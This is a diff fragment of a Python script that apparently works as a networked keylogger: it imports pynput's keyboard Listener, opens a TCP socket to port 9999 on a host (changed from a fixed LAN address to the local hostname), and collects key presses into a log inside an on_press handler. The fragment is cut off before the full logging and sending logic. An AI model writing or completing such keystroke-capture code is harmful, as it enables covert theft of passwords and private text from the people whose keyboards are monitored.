@@ -3,13 +3,13 @@ import os, socket
 from pynput.keyboard import Key, Listener
 
 #Create Socket and Connect
-host = "192.168.4.252"
+host = socket.gethostname()
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((host,9999))
 
 
 log = "\n"
-
+#Read Keyboard input
 def on_press(key):
     global log
     if key != Key.enter:
